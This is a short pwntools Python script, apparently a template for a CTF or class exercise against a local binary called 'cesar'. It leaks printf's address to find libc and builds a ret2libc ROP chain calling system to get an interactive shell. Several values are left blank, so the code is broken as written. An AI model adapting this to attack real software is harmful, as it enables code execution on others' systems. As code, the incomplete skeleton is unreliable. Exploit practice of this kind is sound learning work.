#!/usr/bin/python3

# No olvidar quitar ASLR

from pwn import *

size =

context.binary = './cesar'
io = process([context.binary.path, ''])
libc = ELF('/lib/libc.so.6')

def exploit(io, libc):
    io.sendline(payload(libc))
    io.sendline("13")

def payload(libc):
    rop = ROP(context.binary)
    pop_rdi = 
    sh = 
    system = 
    return flat(,
                endianness="little", word_size=64)

line = str(io.recvline())
line = line.replace('\\n\'', "")
parts = line.split(' ')

printf_a = int(parts[-1], 16)

libc.address = printf_a - libc.symbols['printf']
exploit(io, libc)

io.interactive()
